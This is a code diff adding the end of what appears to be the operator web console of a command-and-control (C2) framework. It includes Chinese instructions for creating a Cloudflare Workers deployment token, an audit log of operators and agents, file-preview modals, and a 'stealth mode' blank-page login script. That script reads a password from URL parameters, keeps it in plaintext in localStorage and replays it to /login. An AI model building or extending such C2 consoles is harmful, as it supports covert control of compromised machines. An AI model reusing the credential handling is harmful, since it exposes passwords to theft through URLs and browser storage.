+              <code style="display:block;margin:6px 0 6px 24px">Account · Workers Scripts · <b>Edit</b></code>
+              <code style="display:block;margin:6px 0 6px 24px">Account · D1 · <b>Edit</b></code>
+              <code style="display:block;margin:6px 0 6px 24px">Account · Workers Subdomain · <b>Read</b></code><br>
+              3. Account Resources 选 <b>Include → 你的账户</b>；点 <b>Continue to summary → Create Token</b><br>
+              4. 复制生成的 Token（只显示一次）粘贴到上面输入框。<br>
+              <span style="color:var(--text-muted)">提示：若 Token 没给账户读取权限导致自动定位失败，把 dash 右侧栏的
+              <b>Account ID</b> 填到"账户 ID"框即可。部署完成后 Token 保存在控制器数据库（GET 接口只回掩码），
+              不需要时可去 CF 面板删除该 Token。</span>
+            </div>
+          </details>
+
+
+        </div>
+          </div>
+        </details>
+        <details id="audit-section" ontoggle="if(this.open) loadAudit()" style="margin:14px 24px;border:1px solid var(--border);border-radius:8px;padding:10px 14px">
+            <summary style="cursor:pointer;font-weight:600">🧾 Audit Log <span style="font-weight:400;font-size:12px;opacity:.7">(who did what, when)</span></summary>
+            <div style="margin-top:8px">
+              <button class="btn-sm" onclick="loadAudit()">🔄 Refresh</button>
+              <div style="max-height:260px;overflow:auto;margin-top:8px;border:1px solid var(--border);border-radius:6px">
+                <table style="width:100%;border-collapse:collapse;font-size:12px">
+                  <thead style="position:sticky;top:0;background:#20263a">
+                    <tr><th style="text-align:left;padding:5px 8px">Time</th><th style="text-align:left;padding:5px 8px">Operator</th><th style="text-align:left;padding:5px 8px">Action</th><th style="text-align:left;padding:5px 8px">Agent</th><th style="text-align:left;padding:5px 8px">Detail</th></tr>
+                  </thead>
+                  <tbody id="audit-tbody"></tbody>
+                </table>
+              </div>
+            </div>
+          </details>
+        </div>
+      </div>
+
+    </div><!-- /tab-panels -->
+  </main>
+</div><!-- /app -->
+
+<!-- Agent note modal -->
+<div id="note-modal" class="modal-backdrop" style="display:none">
+  <div class="modal-box">
+    <div class="modal-title">Agent Note</div>
+    <textarea id="note-input" rows="4" placeholder="Add a note for this agent…"></textarea>
+    <div class="modal-actions">
+      <button class="btn-sm" onclick="closeNoteModal()">Cancel</button>
+      <button class="btn-sm btn-primary" onclick="saveNote()">Save</button>
+    </div>
+  </div>
+</div>
+
+<!-- File preview modal (magic-byte sniffed render: text / image / pdf / hex) -->
+<div id="preview-modal" class="modal-backdrop" style="display:none" onclick="if(event.target===this) closePreview()">
+  <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:0;width:min(920px,92vw);max-height:88vh;display:flex;flex-direction:column;box-shadow:0 12px 40px rgba(0,0,0,.5)">
+    <div style="display:flex;align-items:center;gap:10px;padding:10px 14px;border-bottom:1px solid var(--border)">
+      <span id="preview-kind-badge" style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:#1a3a5a;color:var(--accent)">TEXT</span>
+      <span id="preview-path" style="font-family:var(--mono);font-size:12px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></span>
+      <span id="preview-size" style="font-size:10px;color:var(--text-muted)"></span>
+      <button class="btn-sm" onclick="closePreview()">✕</button>
+    </div>
+    <div id="preview-body" style="flex:1;overflow:auto;padding:0;background:#0d1117"></div>
+    <div style="display:flex;gap:8px;padding:8px 14px;border-top:1px solid var(--border);justify-content:flex-end">
+      <button class="btn-sm" id="preview-dl-btn" style="display:none" onclick="previewDownload()">⬇ Download</button>
+      <button class="btn-sm" onclick="closePreview()">Close</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+// Session keepalive v2: store creds on login, auto re-login on blank page.
+(function() {
+  var body = document.body;
+  var isBlank = !body || body.innerHTML.length < 100;
+
+  // On successful page load (not blank), check if we came from a login redirect
+  // and store credentials for future auto-relogin
+  if (!isBlank) {
+    var url = new URL(location.href);
+    if (url.searchParams.get("login") && url.searchParams.get("pass")) {
+      try {
+        localStorage.setItem("c2-session", JSON.stringify({
+          u: url.searchParams.get("login"),
+          p: url.searchParams.get("pass"),
+          t: Date.now()
+        }));
+      } catch(e) {}
+      // Clean the URL
+      history.replaceState(null, "", location.pathname);
+    }
+    return;
+  }
+
+  // Page is blank (stealth mode). Try auto re-login.
+  var creds = null;
+  try { creds = JSON.parse(localStorage.getItem("c2-session") || "null"); } catch(e) {}
+  if (creds && creds.u && creds.p) {
+    // Check if creds are still valid (< 7 days old)
+    if (Date.now() - (creds.t || 0) < 7 * 24 * 3600 * 1000) {
+      var fd = new FormData();
+      fd.append("username", creds.u);
+      fd.append("password", creds.p);
+      fetch("/login", { method: "POST", body: fd, redirect: "manual" })
+        .then(function(r) {
+          if (r.ok || r.status === 302) {
+            location.replace(location.pathname);
+          } else {
+            localStorage.removeItem("c2-session");
+          }
+        })
+        .catch(function() {});
+    }
+  }
+})();
+</script>
+<script src="/static/js/lang/zh.js"></script>
+<script src="/static/js/lang/en.js"></script>
+<script src="/static/js/i18n.js"></script>
+<script src="/static/js/app.js"></script>
+</body>
+</html>
